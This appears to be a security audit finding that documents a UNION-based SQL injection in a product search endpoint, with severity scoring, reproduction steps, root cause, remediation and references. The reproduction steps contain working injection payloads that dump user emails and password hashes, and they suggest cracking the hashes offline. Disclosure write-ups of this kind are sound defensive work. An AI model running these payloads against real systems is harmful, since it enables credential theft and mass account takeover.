# 10 — UNION-Based SQL Injection: Credential Exfiltration

| | |
|---|---|
| **Severity** | 🔴 Critical |
| **CVSS 3.1** | 9.8 (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`) |
| **Category** | Injection (OWASP A03:2021) |
| **Endpoint** | `GET /rest/products/search?q=` |

## Summary

The product search endpoint concatenates the `q` parameter directly into a SQL query. Beyond simple filter bypass, the flaw allows a **UNION-based** injection: an attacker can append a `UNION SELECT` to pull data from other tables — including the users table — and exfiltrate email addresses and password hashes in the search results.

## Impact

- Full read access to the database, including the users table.
- Disclosure of all users' emails and password hashes → offline cracking → mass account takeover.

## Steps to reproduce

1. Confirm injection by breaking the query:

   ```
   /rest/products/search?q=test'))--
   ```

   A SQL error or altered result set confirms the input reaches the query unsanitized.

2. Determine the number and types of columns returned by the original query using `UNION SELECT` with `NULL` placeholders, increasing until the query succeeds:

   ```
   /rest/products/search?q=test')) UNION SELECT NULL--
   /rest/products/search?q=test')) UNION SELECT NULL,NULL--
   ...continue until no error...
   ```

3. Once the column count matches, place readable data in string columns and exfiltrate credentials:

   ```
   /rest/products/search?q=test')) UNION SELECT id,email,password,NULL,NULL,NULL,NULL,NULL,NULL FROM Users--
   ```

4. The response now contains user emails and password hashes rendered as "products".
5. Crack the recovered hashes offline (e.g. hashcat) to obtain plaintext passwords.

## Root cause

The search value is concatenated into the SQL statement with no parameterization and no type/column allowlisting, so `UNION SELECT` alters the query to read arbitrary tables.

## Remediation

- **Use parameterized queries / prepared statements** for the search filter.
- Use an ORM query builder rather than raw string concatenation.
- Return only the columns the feature needs; never expose credential columns.
- Store passwords with a strong, salted, slow hash (bcrypt/argon2) as defence-in-depth.
- Enforce least-privilege DB accounts.

## References

- [PortSwigger — SQL injection UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CWE-89](https://cwe.mitre.org/data/definitions/89.html)
